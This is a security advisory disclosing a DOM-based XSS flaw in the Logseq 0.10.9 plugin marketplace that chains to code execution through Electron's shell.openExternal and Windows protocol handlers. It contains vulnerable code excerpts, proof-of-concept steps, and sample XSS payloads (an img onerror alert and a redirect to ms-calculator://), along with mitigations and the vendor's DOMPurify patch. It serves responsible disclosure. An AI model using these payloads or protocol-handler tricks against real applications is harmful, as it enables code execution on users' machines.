# Logseq DOM-based XSS Leading to RCE

## Vulnerability Summary

During security testing of the **Logseq** (Desktop/Android) application [[1]](#references)[[2]](#references), version **0.10.9**, a critical-severity **DOM-based Cross-Site Scripting (XSS)** vulnerability [[3]](#references) was identified in the `marketplace.html` endpoint. An attacker can host a malicious Logseq plugin on GitHub with JavaScript embedded in the plugin's `README.md`. When this README is rendered inside the Logseq plugin marketplace, unsanitized input from the document location is directly injected into `innerHTML` which results in arbitrary JavaScript execution. Furthermore, the absence of an allowlist for `shell.openExternal` (exposed via `window.cljs`) allows this DOM-based XSS to escalate to **Remote Code Execution (RCE)** [[4]](#references) by abusing system-level protocol handlers.

### Technical Details

#### DOM-based Cross-Site Scripting (XSS) in the marketplace for plugins

- **File**: `resources/app/marketplace.html`
- **Line**: [82](https://github.com/logseq/logseq/blob/2d8e80954e5de53d62ff4713de0289e9a21c039d/resources/marketplace.html#L82)
- **Description**: Unsanitized input from the document's location (URL parameters) is directly injected into the DOM using `innerHTML`, which can lead to DOM-based XSS (DOMXSS). The rendered `README.md` content from an attacker-controlled GitHub repository is parsed and inserted into the page without proper sanitization.
- **Vulnerability Explanation**: The application parses the plugin's Github repository README content using `marked.parse()` and immediately injects it into the DOM via `innerHTML` (`setContent(content)`), without applying any **HTML sanitization**. If an attacker embeds arbitrary JavaScript into the README file of their plugin Github repository, the code will be executed. This attack is **DOM-based** because the payload is executed client-side and relies on dynamic manipulation of the `repo` parameter in the URL.

```js
. . .
<script>
  ;(async function () {
    const app = document.getElementById('app')
    const url = new URL(location.href)
    const setMsg = (msg) => app.innerHTML = `<strong>${msg}</strong>`
    const repo = url.searchParams.get('repo')
    if (!repo) {
      return setMsg('Repo parameter not found!')
    }

    const setContent = (content) => app.innerHTML = `<main class="markdown-body">${content}</main>`
    const endpoint = (repo, branch, file) => `https://raw.githubusercontent.com/${repo}/${branch}/${file}`

    . . .

    content = marked.parse(content).replace('src="./', `src="${fixLink('')}`)
    setContent(content)
  }())
</script>
. . .
```

#### Lack of Protocol Validation in Electron's Window Logic

- **File**: `src/electron/electron/window.cljs`
- **Line**: [133](https://github.com/logseq/logseq/blob/2d8e80954e5de53d62ff4713de0289e9a21c039d/src/electron/electron/window.cljs#L133)
- **Description**: The function `open-default-app!` calls `shell.openExternal` to open external URLs, but only filters for a basic set of protocols (`http`, `https`, `mailto`) in a limited conditional. There is no comprehensive allowlist to prevent invoking custom or system-level protocol handlers, leaving the application vulnerable to abuse.
- **Vulnerability Explanation**: Electron's `shell.openExternal()` has the ability to invoke OS-level protocol handlers. Since there is no strict allowlist enforced here, an attacker who gains JavaScript execution via the aforementioned DOM-based XSS can craft a payload that performs **Remote Code Execution** (RCE) via system-level protocols.

```clojure
. . .
(defn- open-default-app!
  [url default-open]
  (let [URL (.-URL URL)
        parsed-url (try (URL. url) (catch :default _ nil))]
    (if (and parsed-url (contains? #{"https:" "http:" "mailto:"} (.-protocol parsed-url)))
      (.openExternal shell url)
      (when default-open (default-open url)))))
. . .
```

### CVSS v3.1 Metrics

| Metric      | Value |
|-------------|-------|
| Base Score  | 9.6 (**Critical**) |
| Vector      | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |

### Weakness Enumeration

| CWE ID | Description |
|--------|-------------|
| [CWE-79](http://cwe.mitre.org/data/definitions/79.html) | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') |

---
## Proof of Concept (PoC) Exploit

> - Logseq Desktop/Android application version 0.10.9 was tested on Microsoft Windows 10 and Microsoft Windows 11.
> - For demonstration purposes, **Developer Mode** must be enabled. To do so, open the application, click on `More ( ... icon)`, select `Settings`, go to `Advanced` and enable `Developer mode`.
> - PoC Github repository: https://github.com/martinkubecka/Logseq-XSS-RCE-PoC
> - PoC video demonstration: https://www.youtube.com/watch?v=cBP4TA-BioY

### Steps to Reproduce

1. Launch the Logseq application.
2. In the upper-right corner, click on `More ( ... icon)`, choose `Plugins`, then open the `Marketplace`.
3. Click on any available plugin, for example: `Journals Calendar`.
4. Press `Ctrl + Shift + I` to open **DevTools** and navigate to the **Console** tab.
5. Paste and execute the following code to load the malicious README from an attacker-controlled GitHub repository.

```js
document.querySelector("iframe.lsp-frame-readme").src = "lsp://logseq.com/marketplace.html?repo=martinkubecka/Logseq-Testing";
```

After executing the command above:

The `iframe.lsp-frame-readme` source is changed to load the README file from the `martinkubecka/Logseq-XSS-RCE-PoC` GitHub repository.
This README contains a benign proof-of-concept demonstrating:
- A basic XSS payload: `<img src=x onerror="alert('XSS')">`.
- A chained XSS to RCE payload using a demonstration system protocol handler, resulting in the calculator app being executed on Windows system: `<img src=x onerror="window.location='ms-calculator://'">`.

> *This PoC demonstrates on a benign example the critical impact of unsanitized user input combined with insufficient protocol filtering.*

## Recommended Mitigations

To address the DOM-based XSS and RCE risks stemming from the combination of unsanitized HTML rendering and protocol misuse, the following mitigations are recommended:
1. **Sanitize rendered plugin README content in `marketplace.html`**: Input from the repo query parameter is fetched from GitHub and injected directly into the DOM via innerHTML after being parsed by `marked.parse()`. This content should be sanitized before being inserted.
2. **Implement protocol allowlisting in `window.cljs`**: Introduce a strict allowlist of supported protocols and explicitly block others, especially system-level handlers unless explicitly needed for functionality.

## Vendor Response & Patch Information

The Logseq development team responded promptly to the reported **DOM-based XSS** vulnerability by integrating the **DOMPurify** [[5]](#references) library to sanitize plugin README content rendered in the marketplace. This change mitigates the risk of arbitrary JavaScript execution originating from attacker-controlled plugin metadata.

The fix was incorporated in the release based on the [Logseq DB branch](https://github.com/logseq/logseq/tree/feat/db). Relevant code changes include:
- Addition of the `dompurify` library to the build process in `gulpfile.js`.
- Inclusion of `purify.js` in the HTML rendering logic in `resources/marketplace.html`.
- Sanitization of parsed README content using `DOMPurify.sanitize()` before injection into the DOM.
- A minor update in `plugins.cljs` to ensure correct iframe source resolution.

The patch can be reviewed in this GitHub [commit](https://github.com/logseq/logseq/commit/4cdf49aedd8de073015b6945a529399c3bfa109a#diff-25789e3ba4c2adf4a68996260eb693a441b4a834c38b76167a120f0b51b969f7R72-R74).

While the **DOM-based XSS** was addressed effectively, the second issue, **Lack of Protocol Validation in Electron's Window Logic**, remained unresolved at the time of patch confirmation. On April 29th, 2025, this concern was explicitly communicated to the Logseq support team along with a recommendation to assign CVE ID(s) to both vulnerabilities.

Although system-level protocol handlers are not implemented by the Logseq application itself, the lack of strict validation in its `shell.openExternal` usage enables attackers to exploit them [[6]](#references). Electron's `shell.openExternal()` API delegates URL handling to the underlying operating system [[7]](#references). Once an attacker achieves JavaScript execution, they can invoke handlers such as `search-ms:`, `ms-excel:`, or `ms-word:` to execute arbitrary commands or launch native applications [[8]](#references). For instance, abuse of the `search-ms`: handler has enabled attackers to remotely execute files from SMB shares via malicious search window shortcuts [[9]]. The infamous Follina vulnerability exploited the `ms-msdt:` protocol to achieve code execution through a crafted Office document [[10]](#references). Likewise, protocols like `ms-excel:` and `ms-word:` have been weaponized in phishing campaigns to silently launch Office apps with remote templates [[11]](#references). Without proper validation and the use of security best practices, even Electron applications that appear sandboxed can be exploited to interact with the underlying operating system in unintended and potentially high-risk ways.

## References

- [1] https://logseq.com/
- [2] https://github.com/logseq/logseq
- [3] https://portswigger.net/web-security/cross-site-scripting/dom-based
- [4] https://www.splunk.com/en_us/blog/learn/rce-remote-code-execution.html
- [5] https://github.com/cure53/DOMPurify
- [6] https://benjamin-altpeter.de/shell-openexternal-dangers/ 
- [7] https://www.electronjs.org/docs/latest/tutorial/security#15-do-not-use-shellopenexternal-with-untrusted-content
- [8] https://positive.security/blog/url-open-rce
- [9] https://www.bleepingcomputer.com/news/security/new-windows-search-zero-day-added-to-microsoft-protocol-nightmare/
- [10] https://www.splunk.com/en_us/blog/security/follina-for-protocol-handlers.html
- [11] https://blog.syss.com/posts/abusing-ms-office-protos/
